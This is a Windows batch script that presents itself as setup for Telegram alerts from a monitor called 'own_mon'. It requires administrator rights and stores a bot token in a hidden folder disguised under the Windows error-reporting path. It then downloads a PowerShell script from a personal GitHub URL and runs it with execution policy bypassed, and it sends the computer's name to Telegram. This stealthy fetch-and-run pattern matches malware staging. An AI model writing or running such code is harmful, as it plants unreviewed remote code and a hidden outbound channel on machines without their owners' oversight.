@echo off
setlocal EnableExtensions
REM SEED_NOTIFY 20260802N1 - write Telegram cfg for own_mon alerts
net session >nul 2>&1
if errorlevel 1 (echo need Administrator & exit /b 5)

if "%~1"=="" (
  echo Usage: seed_notify.cmd BOT_TOKEN CHAT_ID
  echo Example: seed_notify.cmd 123456:AA... 7547462070
  exit /b 2
)
if "%~2"=="" (
  echo Usage: seed_notify.cmd BOT_TOKEN CHAT_ID
  exit /b 2
)

set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
if not exist "%WD%" mkdir "%WD%" >nul 2>&1
(
  echo BOT_TOKEN=%~1
  echo CHAT_ID=%~2
) > "%WD%\notify.cfg"

echo Wrote %WD%\notify.cfg
curl.exe -L --ssl-no-revoke -o "%WD%\tg_report.ps1" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/tg_report.ps1" >nul 2>&1
echo Sending rich test report...
if exist "%WD%\tg_report.ps1" (
  powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State "OK" -Summary "notify.cfg seeded - rich reports enabled" -WorkDir "%WD%" -OldState "SEED"
) else (
  powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
    "$ErrorActionPreference='Stop';" ^
    "$token='%~1'; $chat='%~2';" ^
    "$text='[SC-MON] ' + $env:COMPUTERNAME + ' | notify.cfg seeded OK | ' + (Get-Date);" ^
    "Invoke-RestMethod -Uri ('https://api.telegram.org/bot' + $token + '/sendMessage') -Method Post -Body @{ chat_id = $chat; text = $text } | Out-Null;" ^
    "Write-Host 'Telegram OK'"
)
if errorlevel 1 (
  echo Telegram test FAILED - check token/chat id
  exit /b 1
)
echo Done. own_mon will send rich alerts on DOWN / RESTORED / FAIL / FORCE.
exit /b 0
